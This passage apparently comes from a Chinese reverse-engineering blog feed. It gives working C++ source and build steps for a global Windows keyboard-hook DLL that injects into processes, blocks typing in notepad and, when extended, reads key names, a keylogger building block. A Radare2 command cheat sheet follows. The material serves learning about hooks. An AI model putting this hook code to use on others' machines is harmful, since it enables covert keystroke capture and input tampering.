class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROCESS_NAME <span class="hljs-string">&quot;notepad.exe&quot;</span></span><br><br>HINSTANCE g_hInstance = <span class="hljs-literal">NULL</span>;<br>HHOOK g_Hook = <span class="hljs-literal">NULL</span>;<br>HWND g_hWnd = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (fdwReason)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        g_hInstance = hinstDLL;<br>        <br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">KeyboardProc</span><span class="hljs-params">(<span class="hljs-type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> szPath[MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br>    <span class="hljs-type">char</span>* p = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (nCode &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!(lParam &amp; <span class="hljs-number">0x80000000</span>))<br>        &#123;<br>            <span class="hljs-built_in">GetModuleFileNameA</span>(<span class="hljs-literal">NULL</span>, szPath, MAX_PATH);<br>            p = <span class="hljs-built_in">strrchr</span>(szPath, <span class="hljs-string">&#x27;\\&#x27;</span>);<br><br>            <span class="hljs-keyword">if</span> (!_stricmp(p + <span class="hljs-number">1</span>, PROCESS_NAME))<br>            &#123;<br>                <br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            &#125;<br>            <br><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(g_Hook, nCode, wParam, lParam);<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// __cplusplus</span></span><br>    __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HookStart</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        g_Hook = <span class="hljs-built_in">SetWindowsHookEx</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="hljs-number">0</span>);<br>    &#125;<br>    __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HookStop</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (g_Hook)<br>        &#123;<br>            <span class="hljs-built_in">UnhookWindowsHookEx</span>(g_Hook);<br>            g_Hook = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// __cplusplus</span></span><br></code></pre></td></tr></table></figure><h2 id="逐块解释"><a href="#逐块解释" class="headerlink" title="逐块解释"></a>逐块解释</h2><h3 id="dll-1"><a href="#dll-1" class="headerlink" title="dll"></a>dll</h3><p>下面逐块解释一下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HINSTANCE g_hInstance = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">//实例化对象指针</span><br>HHOOK g_Hook = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//钩子指针</span><br>HWND g_hWnd = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">//窗口指针</span><br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Perform actions based on the reason for calling.</span><br>    <span class="hljs-keyword">switch</span> (fdwReason)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        g_hInstance = hinstDLL;  <span class="hljs-comment">//初始化</span><br>        <br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是DLL的程序入口，是一种框架代码，一般的Dll都会这样写。<br>程序会根据fdwReason的值执行不同的函数，fdwReason有四种取值</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">fdwReason 0 DLL_PROCESS_ATTACH  //DLL被加载<br>fdwReason 1 DLL_PROCESS_DETACH  //DLL被卸载<br>fdwReason 2 DLL_THREAD_ATTACH  //创建进程时<br>fdwReason 3 DLL_THREAD_DETACH  //卸载进程时<br></code></pre></td></tr></table></figure><p>当fdwReason为DLL_PROCESS_ATTACH时， lpvReserved为NULL表示动态加载，不为NULL表示静态加载。当fdwReason为DLL_PROCESS_DETACH时, lpvReserved为NULL表示FreeLibrary被调用或DLL加载失败，不为NULL表示进程正在终止。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">KeyboardProc</span><span class="hljs-params">(<span class="hljs-type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//KeyboardProc 是一个回调函数，会作为SetWindowsHookEx的参数，具体处理Hook到的信息</span><br>    <span class="hljs-comment">//ncode参数决定如何处理这个消息</span><br>    <span class="hljs-comment">//wParam 以这个程序为例，存放虚拟键码</span><br>    <span class="hljs-comment">//lParam 存在一些标志，如按下和取消等等</span><br>    <span class="hljs-type">char</span> szPath[MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br>    <span class="hljs-type">char</span>* p = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (nCode &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!(lParam &amp; <span class="hljs-number">0x80000000</span>))  <span class="hljs-comment">//lParam的31bit代表是否按下</span><br>        &#123;<br>            <span class="hljs-built_in">GetModuleFileNameA</span>(<span class="hljs-literal">NULL</span>, szPath, MAX_PATH);<br>            p = <span class="hljs-built_in">strrchr</span>(szPath, <span class="hljs-string">&#x27;\\&#x27;</span>);<br>            <span class="hljs-comment">//拿到进程名字，这个函数是定位到字符出现的最后一个位置</span><br>            <span class="hljs-keyword">if</span> (!_stricmp(p + <span class="hljs-number">1</span>, PROCESS_NAME))<br>            &#123;<br>                <br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            &#125;<br>            <br><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(g_Hook, nCode, wParam, lParam);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数将作为SetWindowsHookEx函数的一个参数，负责处理Hook到的消息，通俗的来讲，你要对截获的信息进行处理，可以是舍弃，变更，修改等等，所以要写一个函数来实现，对于这个程序，功能为判断这个输入是否是在notepad.exe进程中，如果是就不向下传递，如果不是就调用CallNextHookEx(),将信息传递下去。</p><p>ncode参数</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">小于0：必须调用CallNextHookEx函数传递消息<br>0：表示参数wParam和lParam 包含关于虚拟键值相关信息<br>3：在值为0的基础上，表示这个消息被某个进程用PeekMessage查看过<br></code></pre></td></tr></table></figure><p>也就是当ncode&gt;0的时候，可以对进行操作，否则只能传递钩子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// __cplusplus</span></span><br>    __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HookStart</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        g_Hook = <span class="hljs-built_in">SetWindowsHookEx</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="hljs-number">0</span>);<br>    &#125;<br>    __declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HookStop</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (g_Hook)<br>        &#123;<br>            <span class="hljs-built_in">UnhookWindowsHookEx</span>(g_Hook);<br>            g_Hook = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// __cplusplus</span></span><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// __cplusplus</span></span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// __cplusplus</span></span><br></code></pre></td></tr></table></figure><p>有些函数只能在c语言下解析，但是dll源文件是cpp，这个就是告诉编译器什么时候再c语言下解析，什么时候再cpp下解析。</p><p>__declspec(dllexport) 标志导出函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">HHOOK <span class="hljs-title">SetWindowsHookExA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] <span class="hljs-type">int</span>       idHook,  <span class="hljs-comment">//标识钩子的种类 WH_KEYBOARD为键盘钩子</span></span></span><br><span class="hljs-params"><span class="hljs-function">  [in] HOOKPROC  lpfn,    <span class="hljs-comment">//函数指针，这个参数填之前写好的回调函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">  [in] HINSTANCE hmod,    <span class="hljs-comment">//实例</span></span></span><br><span class="hljs-params"><span class="hljs-function">  [in] DWORD     dwThreadId  <span class="hljs-comment">//如果当前的钩子进程与现存的线程相关，那么它的值就是0</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h3><p>主函数较为简单<br>LoadLibraryA 加载dll<br>GetProcAddress 获取dll中的函数地址</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>测试环境 : win10,xp</p><p>看到网上说win10环境下会出现问题，但是我自己试的的时候好像没什么问题。两种测试环境大同小异，win10要编译成64位可执行程序，xp编译成32位可执行程序即可。我这里使用g++编译器</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">g++ -shared ./KeyHook<span class="hljs-selector-class">.cpp</span> -o KeyHook<span class="hljs-selector-class">.dll</span> <span class="hljs-comment">// -shared 表示要生成dll文件，-o 后跟dll的名字</span><br><br>g++ ./KeyHook<span class="hljs-selector-class">.dll</span> hookMain<span class="hljs-selector-class">.cpp</span> -o KeyHook<span class="hljs-selector-class">.exe</span> <span class="hljs-comment">//生成exe文件</span><br><br></code></pre></td></tr></table></figure><p><img src="/../res/3.3.png" alt="效果"> </p><p>生成这两个文件，说明成功</p><p>先运行exe文件，后打开notepad</p><p><img src="/../res/3.4.png" alt="打开notepad"><br>此时键盘输入无效，打开进程管理工具发现KeyHook.dll成功注入</p><p><img src="/../res/3.5.png" alt="注入成功"></p><p>xp 平台测试与win10类似，gcc要用32位版本，而且似乎xp并不支持在当前路劲打开cmd，要用绝对路径。</p><h2 id="全局钩子和显示key"><a href="#全局钩子和显示key" class="headerlink" title="全局钩子和显示key"></a>全局钩子和显示key</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (!_stricmp(p + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;conhost.exe&quot;</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(g_Hook, nCode, wParam, lParam);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">GetKeyNameTextA</span>(lParam,str,<span class="hljs-number">50</span>);   <span class="hljs-comment">//定义一个str存放key</span><br>            &#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetKeyNameTextA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  LONG  lParam,</span></span><br><span class="hljs-params"><span class="hljs-function">  [out] LPSTR lpString,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]  <span class="hljs-type">int</span>   cchSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>开始以为参数是存放在wParam中，一直没有成功。</p><p><img src="/../res/3.6.png" alt="在任何位置输入都会被拦截"></p>]]></content>
    
    
    <categories>
      
      <category>RE</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Radare2--linux系统下的动态调试工具</title>
    <link href="/2024/05/12/r2-%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/05/12/r2-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>需要进行linux文件的动态调试(其实是懒得分析静态逻辑),但是linux平台不晓得有没有什么特别好的调试工具,所以学习一下Radare2,顺便记录指令，方便以后查阅</p><h2 id="让r2自动分析可执行文件"><a href="#让r2自动分析可执行文件" class="headerlink" title="让r2自动分析可执行文件"></a>让r2自动分析可执行文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">r2 -A ./fileName<br></code></pre></td></tr></table></figure><h2 id="获取一些基本的二进制信息"><a href="#获取一些基本的二进制信息" class="headerlink" title="获取一些基本的二进制信息"></a>获取一些基本的二进制信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iI<br></code></pre></td></tr></table></figure><h2 id="查看导入和导出函数"><a href="#查看导入和导出函数" class="headerlink" title="查看导入和导出函数"></a>查看导入和导出函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ii    //查看导入函数<br>iE    //查看到处函数<br></code></pre></td></tr></table></figure><h2 id="查看函数"><a href="#查看函数" class="headerlink" title="查看函数"></a>查看函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl       // <span class="hljs-keyword">function</span> list<br></code></pre></td></tr></table></figure><h2 id="交叉引用"><a href="#交叉引用" class="headerlink" title="交叉引用"></a>交叉引用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">axt  函数名<br>axt 地址<br></code></pre></td></tr></table></figure><h2 id="寻找定位"><a href="#寻找定位" class="headerlink" title="寻找定位"></a>寻找定位</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">s 地址或函数名<br></code></pre></td></tr></table></figure><h2 id="十六进制视图"><a href="#十六进制视图" class="headerlink" title="十六进制视图"></a>十六进制视图</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">px<br></code></pre></td></tr></table></figure><h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">s 函数名   //找到函数 或地址<br>pdf <br></code></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iz   //显示程序中的字符串<br></code></pre></td></tr></table></figure><h2 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">VV <br></code></pre></td></tr></table></figure><p><strong>目前为止，还都只是静态调试，我把这些称为鸡肋命令，因为ida完全可以替代，接下来才是关键</strong></p><h2 id="启动调试器"><a href="#启动调试器" class="headerlink" title="启动调试器"></a>启动调试器</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">-d //启动调试器<br>db //添加断点<br>dbi //查看断点<br>dc //开始运行<br>dbt //查看堆栈<br>drr //转存寄存器<br></code></pre></td></tr></table></figure><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>需要下载一个插件r2dec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">r2pm install r2dec<br>r2pm -l //查看下载的插件<br>pdda   //反编译指令<br><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总的来说基本能实现x64dbg功能，但是命令行会有一些不方便,虽然ida也支持远程动态调试，但我总是配置不好，也不太懂附加进程调试，所以先用一下r2试一下</p>]]></content>
    
    
    <categories>
      
      <category>RE</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
